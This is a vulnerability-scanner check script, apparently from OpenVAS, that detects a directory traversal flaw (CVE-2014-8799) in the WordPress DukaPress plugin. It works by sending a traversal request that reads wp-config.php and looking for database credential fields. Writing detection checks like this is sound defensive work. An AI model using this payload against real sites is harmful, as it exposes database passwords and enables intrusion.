CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805122" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2014-8799" );
	script_bugtraq_id( 71294 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-01-09 15:07:11 +0530 (Fri, 09 Jan 2015)" );
	script_name( "WordPress DukaPress 'src' Parameter Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  DukaPress and is prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not." );
	script_tag( name: "insight", value: "Flaw is due to the dp_img_resize function
  in the php/dp-functions.php script not properly sanitizing user input,
  specifically path traversal style attacks (e.g. '../') via the 'src'
  parameter that contains '..' to lib/dp_image.php." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to download arbitrary files." );
	script_tag( name: "affected", value: "WordPress DukaPress plugin before 2.5.4" );
	script_tag( name: "solution", value: "Update to version 2.5.4 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/98943" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/35346" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/dukapress" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/dukapress/lib/dp_image.php" + "?src=../../../../wp-config.php";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "DB_NAME", extra_check: make_list( "DB_USER",
	 "DB_PASSWORD" ) )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

